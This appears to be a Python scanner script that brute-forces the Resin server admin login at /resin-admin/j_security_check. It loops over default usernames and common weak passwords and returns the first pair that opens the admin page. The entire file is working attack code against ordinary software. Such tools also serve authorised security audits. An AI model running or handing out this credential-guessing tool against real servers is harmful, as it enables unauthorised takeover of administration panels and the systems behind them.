#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-08-09 10:14:05
# @Author  : luoshu (luovxv@gamil.com)
# @Link    : https://www.gitshell.org

import requests

def WeakScan(host,port):
    url = 'http://%s:%s/resin-admin/j_security_check?j_uri=status.php' % (host,str(port))
    flag = ['Resin Summary','Resin Administration']
    username = ['admin','system']
    password = ['admin','123456','12345678','123456789','admin123','admin888','admin1','system','8888888','123123','admin','manager','root','111111','11111111']
    for user in username:
        for pwd in password:
            data = {'j_username':user,'j_password':pwd}
            try:
                req = requests.post(url=url, data=data, timeout=10)
                req_code = req.status_code
                req_text = req.text
                print(req_code)
            except Exception as e:
                break
            if req_code == 403:
                break
            if req_code == 404:
                break
            for f in flag:
                if f in req_text:
                    return(user+':'+pwd)



